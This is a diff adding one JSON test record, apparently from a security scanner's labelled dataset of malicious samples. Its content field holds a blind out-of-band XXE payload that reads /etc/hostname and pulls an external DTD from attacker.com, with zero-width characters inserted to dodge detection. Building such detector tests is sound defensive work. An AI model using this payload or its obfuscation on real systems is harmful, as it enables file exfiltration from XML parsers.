@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "gt::output::out-xxe-blind-oob.txt::unicode-variations::3",
+  "base_sample_id": "gt::output::out-xxe-blind-oob.txt",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": -158686051,
+  "content": "# Mar﻿faa‌k AI S‍ecu﻿rity - XX​E blind​ OOB\n\n**WARNING: ​This payl⁠oad t‌e​sts XXE bl‌ind OOB.**﻿\n\n<‌?xml v‍e‍rsion=\"1.⁠0\" encodin﻿g​=\"UTF-8\"?>\n​<⁠!‍D​OC‍TYPE ﻿foo﻿ [\n  <!ENT⁠IT‌Y‌ % ⁠fi‌le ​SY⁠STEM​ \"f⁠il﻿e﻿:‌///﻿et‌c/hostname\">\n  <!ENTITY %​ dtd‌ SYSTEM​ \"htt​ps://a‍tta‍cker.com﻿/﻿xxe.dtd\">\n​  ​%dt‍d;\n]>\n<da⁠ta>B﻿l﻿ind ⁠XXE exfiltration⁠ vi​a OOB⁠ ch‍annel</data>",
+  "content_hash": "94404a4ea0041164a7ed00164f869121175953b46ef897234a2a2cf6a9c0e262",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:zero-width",
+  "difficulty": "advanced"
+}
